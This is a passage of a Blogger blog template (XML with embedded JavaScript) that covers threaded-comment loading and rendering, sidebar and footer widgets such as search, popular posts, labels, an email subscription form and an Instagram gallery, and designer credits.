        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
</b:includable>
                        <b:includable id='threaded_comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <h4><data:post.commentLabelFull/> for &quot;<data:post.title/>&quot;</h4>
<div class='inner'>
    <div class='comments-content'>
      <b:if cond='data:post.embedCommentForm'>
        <b:include data='post' name='threaded_comment_js'/>
      </b:if>
      <div id='comment-holder'>
         <data:post.commentHtml/>
      </div>
    </div>

    <p class='comment-footer'>
      <b:if cond='data:post.allowNewComments'>
        <b:include data='post' name='threaded-comment-form'/>
      <b:else/>
        <data:post.noNewCommentsText/>
      </b:if>
    </p>

    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:if cond='data:post.showBacklinks'>
         <b:include data='post' name='backlinks'/>
       </b:if>
    </div>
    </div>
  </div>
</div>
</b:includable>
                      </b:widget>
                    </b:section>

            </div><!-- /main-wrapper -->

<div class='sidebar-wrapper'>
<b:section class='sidebar' id='sidebar' showaddelement='yes'>
  <b:widget id='HTML2' locked='false' title='search' type='HTML'>
    <b:includable id='main'>
    <div class='widget-content'>
      <form action='/search' id='search_block' method='get'>
	<div>
					
		<input id='search_field_block' name='q' onblur='if(this.value==&apos;&apos;)this.value=this.defaultValue;' onfocus='if(this.value==this.defaultValue)this.value=&apos;&apos;;' type='text' value='Enter keywords �'/>
		<!-- end search field -->
					
      <input id='search_submit_block' type='submit' value='GO'/>
	</div>	
	<!-- end search submit -->
</form>
</div>
</b:includable>
  </b:widget>
  <b:widget id='PopularPosts2' locked='false' title='Popular Posts' type='PopularPosts'>
    <b:includable id='main'>
  <b:if cond='data:title'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='data:showThumbnails == &quot;false&quot;'>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (3) Show only thumbnails -->
            <div class='item-thumbnail-only'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            </div>
            <div style='clear: both;'/>
          <b:else/>
            <!-- (4) Show snippets and thumbnails -->
            <div class='item-content'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
              <div class='item-snippet'><data:post.snippet/></div>
            </div>
            <div style='clear: both;'/>
          </b:if>
        </b:if>
      </li>
      </b:loop>
    </ul>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
  <b:widget id='HTML1' locked='true' title='Subscribe Via Email (Do Not Edit Here!)' type='HTML'>
    <b:includable id='main'>

<!-- Opt-In Subscribe -->
<h5><i class='icon-envelope-alt'/>Email Newsletter</h5>
<p>Subscribe to our newsletter to get the latest updates to your inbox. ;-)</p>
<br/>
<p>Your email address is safe with us!</p>
<div id='btntEmailsub'>
	<form action='http://feedburner.google.com/fb/a/mailverify' id='subscribe' method='post' onsubmit='window.open(&apos;http://feedburner.google.com/fb/a/mailverify?uri=templatetrackers&apos;, &apos;popupwindow&apos;, &apos;scrollbars=yes,width=550,height=520&apos;);return true' target='popupwindow'>
		<input name='uri' type='hidden' value='templatetrackers'/>
		<input name='loc' type='hidden' value='en_US'/>
		<input id='subbox' name='email' onblur='if (this.value == &quot;&quot;) {this.value = &quot;Enter your email...&quot;;}' onfocus='if (this.value == &quot;Enter your email...&quot;) {this.value = &quot;&quot;}' type='text' value='Enter your email...'/>
		<input id='subbutton' title='' type='submit' value='Sign up'/>
	</form>
</div>

</b:includable>
  </b:widget>
  <b:widget id='Label2' locked='false' title='Labels' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
  </div>
</b:includable>
  </b:widget>
</b:section>
</div><!-- /sidebar-wrapper -->
<div class='clr'/>
            </div><!-- /ct-wrapper -->
            </div><!-- /outer-wrapper -->

<div id='footer'>
    <div class='ct-wrapper'>
<b:section class='footer' id='footer1' preferred='yes'>
  <b:widget id='Label1' locked='false' title='Labels' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>

<b:section class='footer' id='footer2' preferred='yes'>
  <b:widget id='PopularPosts1' locked='false' title='Popular Posts' type='PopularPosts'>
    <b:includable id='main'>
  <b:if cond='data:title'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='data:showThumbnails == &quot;false&quot;'>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (3) Show only thumbnails -->
            <div class='item-thumbnail-only'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            </div>
            <div style='clear: both;'/>
          <b:else/>
            <!-- (4) Show snippets and thumbnails -->
            <div class='item-content'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
              <div class='item-snippet'><data:post.snippet/></div>
            </div>
            <div style='clear: both;'/>
          </b:if>
        </b:if>
      </li>
      </b:loop>
    </ul>
   </div>
</b:includable>
  </b:widget>
</b:section>

<b:section class='footer' id='footer3' preferred='yes'>
  <b:widget id='HTML3' locked='false' title='Gallery' type='HTML'>
    <b:includable id='main'>
  <b:if cond='data:title'><h2><data:title/></h2></b:if>
<!-- SnapWidget -->
<iframe allowTransparency='true' frameborder='0' scrolling='no' src='http://snapwidget.com/in/?h=aWxsc3V0cmF0aW9ufGlufDgwfDN8M3x8bm98NXxub25lfG9uU3RhcnR8eWVz&amp;v=14514' style='border:none; overflow:hidden; width:255px; height:255px' title='Instagram Widget'/>      

</b:includable>
  </b:widget>
</b:section>


    <div class='clr'/>

            </div><!-- /ct-wrapper -->
</div><!-- footer -->

  <div class='footer-credits'>
    <div class='ct-wrapper'>
      <p>&#169; 2012 <a expr:href='data:blog.homepageUrl'><data:blog.title/></a></p>
	<p>All rights Reserved</p>
      <p>Designed By <a href='http://www.templatetrackers.com' id='ident'>Template Trackers</a> - Published By <a href='http://gooyaabitemplates.com/' rel='dofollow' target='_blank' title='Blogger Templates'>Gooyaabi Templates</a></p>
    </div><!-- /ct-wrapper -->
  </div><!-- footer-credits -->

<!-- bg image -->
<div class='bg-image'>
  <div class='ctwra'/>
<img alt='background' class='bg' src='http://1.bp.blogspot.com/-ywfzMtufj6Y/U2NGQeor0hI/AAAAAAAAFy4/OzjisBYMTMQ/s1600/bg3.jpg'/>
</div>

<b:include data='blog' name='google-analytics'/>


<script type='text/javascript'>var addthis_config = {&quot;data_track_addressbar&quot;:true};</script>
<script src='//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-52d20df756f40872' type='text/javascript'/>
<!-- AddThis Button END -->

</body>
</html>